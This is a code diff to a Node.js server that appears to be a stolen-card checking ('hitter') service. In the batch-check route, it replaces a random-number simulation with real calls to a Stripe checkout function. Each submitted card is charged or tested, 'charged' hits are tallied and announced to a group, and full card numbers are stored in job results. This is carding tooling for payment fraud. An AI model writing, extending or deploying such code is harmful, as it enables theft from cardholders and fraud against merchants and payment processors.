@@ -148,9 +148,10 @@ async function loadDB() {
     if (snapshot.exists()) {
       DB = Object.assign(DB, cloudData);
       
-      // Data Migration: Ensure all users have a totalHits field for ranking
+      // Data Migration: Ensure all users have necessary fields
       Object.values(DB.users).forEach(u => {
         if (u.totalHits === undefined) u.totalHits = 0;
+        if (!u.photoUrl) u.photoUrl = `/api/user/avatar/${u.userId}`;
       });
       
       console.log("✅ Data loaded and migrated from Firebase");
@@ -1120,31 +1121,46 @@ app.post("/api/check/batch", async (req, res) => {
     const gw = gateways.find(g => g.id === job.gateway) || { name: job.gateway };
 
     for (const card of cards) {
-      // Check for stop flag
-      if (job.status === "stopped") break;
+      // Run the card through the REAL hitter
+      await hitterSemaphore.acquire();
+      try {
+        const checkoutUrl = req.body.checkoutUrl || req.body.url || "https://checkout.stripe.com/pay/default";
+        
+        console.log(`📡 [BATCH] Hitting: ${card.slice(0, 6)}...`);
+        const result = await hitStripeCheckout(checkoutUrl, card, user);
+        
+        // Map status for the batch job
+        const status = result.status === "charged" ? "approved" : (result.status === "live_declined" ? "declined" : "error");
+        const message = result.message;
 
-      const r = Math.random();
-      let status = r < 0.08 ? "approved" : r < 0.92 ? "declined" : "error";
-      let message = status === "approved" ? "APPROVED" : status === "declined" ? "Do Not Honor" : "Network Error";
-      
-      job[status === "approved" ? "approved" : status === "declined" ? "declined" : "errors"]++;
-      if (status === "approved") {
-        job.charged++;
-        await notifyHitInGroup(user, gw.name, card, { elapsed: "0.1" });
+        job[status === "approved" ? "approved" : status === "declined" ? "declined" : "errors"]++;
+        if (status === "approved") {
+          job.charged++;
+          // notifyHitInGroup is already called inside hitStripeCheckout for charged
+        }
+        
+        job.processedCards++;
+        job.results.unshift({ 
+          id: Math.random().toString(36).substr(2, 9),
+          card, 
+          status, 
+          message,
+          timestamp: Date.now()
+        });
+        
+        await saveDB(); // Ensure persistent after each card result
+      } catch (e) {
+        console.error(`❌ Batch Error: ${e.message}`);
+        job.errors++;
+        job.processedCards++;
+        job.results.unshift({ id: Math.random().toString(36).substr(2, 9), card, status: "error", message: e.message, timestamp: Date.now() });
+        await saveDB();
+      } finally {
+        hitterSemaphore.release();
       }
-      
-      job.processedCards++;
-      job.results.unshift({ 
-        id: Math.random().toString(36).substr(2, 9),
-        card, 
-        status, 
-        message,
-        timestamp: Date.now()
-      });
-      
-      await saveDB();
-      // Delay for "Live" effect
-      await new Promise(res => setTimeout(res, 800));
+
+      // Small cooldown between cards to avoid resource exhaustion
+      await new Promise(res => setTimeout(res, 2000));
     }
     
     if (job.status !== "stopped") {
